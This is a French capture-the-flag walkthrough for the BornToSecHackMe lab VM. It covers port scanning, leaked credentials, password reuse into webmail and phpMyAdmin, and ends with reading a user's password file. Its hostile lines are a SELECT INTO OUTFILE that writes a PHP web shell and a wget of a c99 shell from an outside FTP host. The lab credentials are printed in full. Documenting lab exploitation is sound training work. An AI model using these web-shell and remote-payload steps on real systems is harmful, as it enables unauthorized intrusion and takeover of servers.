On demarre l'exploitation :

// #############################################################################
1) Verification des ports ouverts
// #############################################################################

On utilise nmap qui est un programme pour scanner les ports.
UDP et TCP.
Donc on scanne du port 1-1000 deja.
ont vois quelques port connue :
22 ssh
80 server http
143 imap (webmail)
443 server https
993 imaps (webmail)

// #############################################################################
2) Regarder un peu les site :
// #############################################################################

On vois un index sur le path / en http
On vois un forum sur le path /forum en https
On vois un phpmyadmin sur le path bien connue /phpmyadmin
On vois un webmail sur le path bien connue /webmail

// #############################################################################
3) un peu de stalk sur le forum
// #############################################################################

Apres un peu de stalk on trouve quelques messages sympatique :
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard
Monsieur BornToSecHackMe nous offre jentilement sont mot de pass forum :

https://10.11.200.238/forum
login: lmezard
password: !q\]Ej?*5K5cy*AJ

// #############################################################################
4) Le con a laisser le meme password
// #############################################################################

Une fois connecter sur le forum avec lmezard je vais dans profil settings.
Je vois un email :
laurie@borntosec.net

du coup je tente une connection sur le webmail avec cette email est sont mot de passe forum.
Youpi connecter !

https://10.11.200.238/webmail
login: laurie@borntosec.net
password: !q\]Ej?*5K5cy*AJ

// #############################################################################
5) La base de donn√©es
// #############################################################################
Une fois connecter sur le webmail deux mails sont presents :
DB Access et Very interesting !!!!
dans BB Access on obtient l'user root mysql est le mot de passe

Use root/Fg-'kKXBj87E:aJ$

// #############################################################################
6) L'exploitation via phpmyadmin
// #############################################################################
Avec les identifiants mysql je peu maintenant me connecter sur phpmyadmin.

SELECT "<?php System($_GET['get']); ?>" into outfile "/var/www/forum/templates_c/get.php"
ensuite pour inserer le shell code :
j'ai installer un shellcode sur un ftp : ftp://185.157.247.103/c99kkkk.php
du coup je fait
https://10.11.200.238/forum/templates_c/get.php?cmd=wget%20ftp://185.157.247.103/c99kkkk.php
ensuite je vais sur https://10.11.200.238/forum/templates_c/c99kkkk.php
voila j'ai mon shell code sur le site.

// #############################################################################
7) Premier mot de passe
// #############################################################################
en me balandant sur /home ont vois un dossier LOOKATME
je vais dedans et je vois un fichier password
cat password

lmezard:G!@M6f4Eatau{sF"

voila le mot de passe de lmezard user.

// #############################################################################
LEXPLOIT COMMENCE
// #############################################################################
